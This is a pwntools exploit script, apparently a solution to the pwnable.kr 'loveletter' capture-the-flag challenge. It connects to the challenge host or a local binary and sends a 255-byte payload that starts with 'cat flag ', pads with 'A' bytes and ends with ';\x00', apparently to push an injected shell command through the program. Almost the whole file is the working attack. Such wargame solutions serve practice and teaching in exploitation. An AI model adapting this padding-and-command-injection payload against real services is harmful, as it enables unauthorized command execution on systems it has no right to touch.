#!/usr/bin/env python3
from pwn import *

elf = ELF("./loveletter")
#libc = ELF("./")
#ld = ELF("./")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#contpayloadt.log_level = "debug"
gs = '''
break main
'''

domain= "pwnable.kr"
port = 9034

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
        # you need r.interactive() !
    else:
        return process([elf.path])
r = start()

# rop = ROP(elf)
# rop = ROP(elf, libc)
# rop = ROP(elf, libc, ld)

#========= payloadploit here ===================
payload = b"cat flag "
payload += b"A" * (256 - len(payload) - 3) + b";\x00"
assert len(payload) == 255
r.sendline(payload)
r.interactive()
